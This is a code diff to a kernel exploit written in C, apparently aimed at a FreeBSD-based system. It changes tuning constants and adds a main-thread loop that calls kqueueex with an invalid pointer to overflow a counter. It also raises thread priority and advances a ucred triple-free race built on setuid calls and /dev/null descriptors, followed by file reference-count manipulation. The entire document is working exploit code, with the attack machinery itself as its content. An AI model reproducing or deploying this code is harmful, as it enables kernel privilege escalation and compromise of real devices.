@@ -49,17 +49,17 @@
 #define COMMAND_UIO_READ   0
 #define COMMAND_UIO_WRITE  1
 
-#define MAIN_CORE          5
-#define ERR_TRIPLE_FREE    1
-#define ERR_LEAK_KQUEUE    2
+#define MAIN_CORE          0
+#define ERR_TRIPLE_FREE    2
+#define ERR_LEAK_KQUEUE    3
 
-#define NULL_FD_COUNT           16
+#define NULL_FD_COUNT           0x14
 #define TRIPLEFREE_ATTEMPTS     8
-#define MAX_ROUNDS_TWIN         10
 #define MAX_ROUNDS_TRIPLET      500
 
 #define KQEX_THREAD_NUM         3
-#define KQUEUEEX_CALLS          0xFFFFFFF1ULL
+#define KQUEUEEX_CALLS          0xFFFF0000ULL
+#define KQUEUEEX_MAIN_CALLS     0xFFEDULL
 #define KQUEUEEX_INVALID_PTR    0x800000000000ULL
 
 #define KERNEL_PID         0
@@ -621,6 +621,8 @@ static void *uio_thread_fn(void *arg)
 
 static void log_progress(exploit_ctx_t *ctx, u32 pct, u32 eta_min, u64 count)
 {
+    if (ctx->log_sock <= 0 || !ctx->fn_sendto) return;
+    if (pct >= 100) return;
     const char *h = "0123456789abcdef";
     char buf[64] = {0};
     char *p = buf;
@@ -653,6 +655,7 @@ static void  kqex_thread_fn(void *arg)
     ((u16*)mask)[0] = (u16)(1 << ta->core);
     CALL(ctx, fn_cpuset_setaffinity,
          CPU_LEVEL_WHICH, CPU_WHICH_TID, (u64)-1LL, CPU_SET_SIZE, (u64)mask, 0);
+    rtprio_thread(ctx, 256);
 
     while (!ctx->kqex_go) {}
 
@@ -888,7 +891,6 @@ static s32 trigger_ucred_triple_free(exploit_ctx_t *ctx)
     LOG(ctx, "tctf: kqex threads spawned (thr_new)\n");
 
     ctx->kqex_go = 1;
-    LOG(ctx, "tctf: kqueueex threads signaled\n");
 
     u32 elapsed_min = 0;
     while (ctx->kqex_done < KQEX_THREAD_NUM) {
@@ -900,8 +902,16 @@ static s32 trigger_ucred_triple_free(exploit_ctx_t *ctx)
                    (u64)elapsed_min * (KQUEUEEX_CALLS - done) / done;
         log_progress(ctx, (u32)pct, (u32)eta, done);
     }
-    LOG(ctx, "tctf: kqueueex overflow done\n");
+    LOG(ctx, "tctf: running remain calls at main thread...\n");
+    CALL(ctx, fn_sleep, 5, 0, 0, 0, 0, 0);
 
+    for (u64 n = 0; n < KQUEUEEX_MAIN_CALLS; n++) {
+        CALL(ctx, fn_kqueueex, KQUEUEEX_INVALID_PTR, 0, 0, 0, 0, 0);
+    }
+    CALL(ctx, fn_sleep, 5, 0, 0, 0, 0, 0);
+
+    LOG(ctx, "tctf: Creating /dev/null fds...\n");
+    
     for (int i = 0; i < NULL_FD_COUNT; i++) {
         ctx->null_fds[i] = (s32)CALL(ctx, fn_open,
                                      (u64)"/dev/null", O_RDONLY, 0, 0, 0, 0);
@@ -911,7 +921,7 @@ static s32 trigger_ucred_triple_free(exploit_ctx_t *ctx)
     CALL(ctx, fn_setuid, 1, 0, 0, 0, 0, 0);
     CALL(ctx, fn_sleep, 10, 0, 0, 0, 0, 0);
     LOG(ctx, "tctf: second setuid done\n");
-
+    
     ctx->free_fd_idx = 0;
     s32 race_ok = 0;
     for (int attempt = 0; attempt < TRIPLEFREE_ATTEMPTS; attempt++) {
@@ -1666,6 +1676,7 @@ u64 main(u64 arg1, u64 arg2, u64 arg3, u64 arg4, u64 arg5, u64 arg6)
             ctx.null_fds[i] = -1;
         }
     }
+    LOG(&ctx, "exploit: closed reamining /dev/null fds\n");
 
     fhold(&ctx, fget(&ctx, ctx.master_pipe[0]));
     fhold(&ctx, fget(&ctx, ctx.master_pipe[1]));
